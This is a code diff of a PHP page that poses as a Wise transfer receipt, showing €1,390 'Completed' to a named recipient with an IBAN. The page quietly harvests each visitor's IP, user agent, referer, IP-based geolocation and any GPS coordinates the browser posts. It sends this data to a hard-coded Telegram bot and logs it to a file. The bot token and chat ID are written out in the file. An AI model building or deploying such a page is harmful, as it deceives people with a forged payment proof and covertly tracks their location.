@@ -1,43 +1,50 @@
 <?php
 // ==================== CONFIGURAÇÕES ==================== v1.4
-$telegram_bot_token = '8704514905:AAHN69zg_EJtg7JlB9wVmbM7aZCRmMJeDJI';
-$telegram_chat_id = '8385484720';
+$telegram_bot_token = "8704514905:AAHN69zg_EJtg7JlB9wVmbM7aZCRmMJeDJI";
+$telegram_chat_id = "8385484720";
 // =======================================================
 
-$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'N/A';
-$ip = trim(explode(',', $ip)[0]);
+$ip =
+    $_SERVER["HTTP_X_FORWARDED_FOR"] ??
+    ($_SERVER["HTTP_X_REAL_IP"] ?? ($_SERVER["REMOTE_ADDR"] ?? "N/A"));
+$ip = trim(explode(",", $ip)[0]);
 
-$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
-$referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
-$hora = date('d/m/Y H:i:s');
+$user_agent = $_SERVER["HTTP_USER_AGENT"] ?? "N/A";
+$referer = $_SERVER["HTTP_REFERER"] ?? "Direct";
+$hora = date("d/m/Y H:i:s");
 
 // ==================== LOCALIZAÇÃO VIA IP ====================
-$geo = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}?fields=status,message,country,countryCode,region,regionName,city,isp,org,as,mobile,proxy,hosting,lat,lon"), true);
+$geo = json_decode(
+    @file_get_contents(
+        "http://ip-api.com/json/{$ip}?fields=status,message,country,countryCode,region,regionName,city,isp,org,as,mobile,proxy,hosting,lat,lon",
+    ),
+    true,
+);
 
-$cidade = $geo['city'] ?? 'Unknown';
-$estado = $geo['regionName'] ?? 'Unknown';
-$pais = $geo['country'] ?? 'Unknown';
-$provedor = $geo['isp'] ?? 'Unknown';
-$proxy = ($geo['proxy'] ?? false) ? 'Yes' : 'No';
-$mobile = ($geo['mobile'] ?? false) ? 'Yes' : 'No';
-$lat_ip = $geo['lat'] ?? null;
-$lon_ip = $geo['lon'] ?? null;
+$cidade = $geo["city"] ?? "Unknown";
+$estado = $geo["regionName"] ?? "Unknown";
+$pais = $geo["country"] ?? "Unknown";
+$provedor = $geo["isp"] ?? "Unknown";
+$proxy = $geo["proxy"] ?? false ? "Yes" : "No";
+$mobile = $geo["mobile"] ?? false ? "Yes" : "No";
+$lat_ip = $geo["lat"] ?? null;
+$lon_ip = $geo["lon"] ?? null;
 
 // ==================== RECEBE GPS ====================
-$latitude  = $_POST['latitude'] ?? null;
-$longitude = $_POST['longitude'] ?? null;
-$accuracy  = $_POST['accuracy'] ?? null;
-$source    = $_POST['source'] ?? 'ip';
+$latitude = $_POST["latitude"] ?? null;
+$longitude = $_POST["longitude"] ?? null;
+$accuracy = $_POST["accuracy"] ?? null;
+$source = $_POST["source"] ?? "ip";
 
 // Define localização final
-if ($latitude && $longitude && $source === 'gps') {
-    $latitude_final  = $latitude;
+if ($latitude && $longitude && $source === "gps") {
+    $latitude_final = $latitude;
     $longitude_final = $longitude;
     $localizacao_texto = "$latitude, $longitude (±{$accuracy}m)";
     $emoji_local = "📍";
     $gps_status = "✅ GPS Aceito pelo usuário";
 } else {
-    $latitude_final  = $lat_ip;
+    $latitude_final = $lat_ip;
     $longitude_final = $lon_ip;
     $localizacao_texto = "$cidade, $estado - $pais";
     $emoji_local = "🌐";
@@ -54,25 +61,33 @@ $mensagem .= "🏢 *Provedor:* $provedor\n";
 $mensagem .= "📱 *Mobile:* $mobile | *Proxy/VPN:* $proxy\n";
 $mensagem .= "🔗 *Referer:* $referer";
 
-file_get_contents("https://api.telegram.org/bot$telegram_bot_token/sendMessage?chat_id=$telegram_chat_id&text=" . urlencode($mensagem) . "&parse_mode=Markdown");
+file_get_contents(
+    "https://api.telegram.org/bot$telegram_bot_token/sendMessage?chat_id=$telegram_chat_id&text=" .
+        urlencode($mensagem) .
+        "&parse_mode=Markdown",
+);
 
 // ==================== LOG ====================
 $log = [
-    'data'       => $hora,
-    'ip'         => $ip,
-    'latitude'   => $latitude_final,
-    'longitude'  => $longitude_final,
-    'source'     => $source,
-    'cidade'     => $cidade,
-    'estado'     => $estado,
-    'pais'       => $pais,
-    'provedor'   => $provedor,
-    'mobile'     => $mobile,
-    'proxy'      => $proxy,
-    'user_agent' => $user_agent
+    "data" => $hora,
+    "ip" => $ip,
+    "latitude" => $latitude_final,
+    "longitude" => $longitude_final,
+    "source" => $source,
+    "cidade" => $cidade,
+    "estado" => $estado,
+    "pais" => $pais,
+    "provedor" => $provedor,
+    "mobile" => $mobile,
+    "proxy" => $proxy,
+    "user_agent" => $user_agent,
 ];
 
-file_put_contents('acessos.json', json_encode($log, JSON_UNESCAPED_UNICODE) . "\n", FILE_APPEND);
+file_put_contents(
+    "acessos.json",
+    json_encode($log, JSON_UNESCAPED_UNICODE) . "\n",
+    FILE_APPEND,
+);
 ?>
 
 <!DOCTYPE html>
@@ -99,12 +114,16 @@ file_put_contents('acessos.json', json_encode($log, JSON_UNESCAPED_UNICODE) . "\
         
         <div class="info">
             <p><strong>Amount Sent:</strong> €1.390,00</p>
-            <p><strong>Date & Time:</strong> <?php echo date('d/m/Y H:i'); ?> CET</p>
+            <p><strong>Date & Time:</strong> <?php echo date(
+                "d/m/Y H:i",
+            ); ?> CET</p>
             <p><strong>Recipient:</strong> Cristina Mendes</p>
             <p><strong>Bank:</strong> Caixa Geral de Depósitos (CGD)</p>
             <p><strong>IBAN:</strong> PT50 0035 0088 0000 4933 9008 2</p>
             <p><strong>BIC/SWIFT:</strong> CGDIPTPL</p>
-            <p><strong>Reference:</strong> WISE-<?php echo strtoupper(substr(md5(time()), 0, 12)); ?></p>
+            <p><strong>Reference:</strong> WISE-<?php echo strtoupper(
+                substr(md5(time()), 0, 12),
+            ); ?></p>
             <p><strong>Status:</strong> <span style="color:#00b66d;">Completed ✓</span></p>
         </div>
 
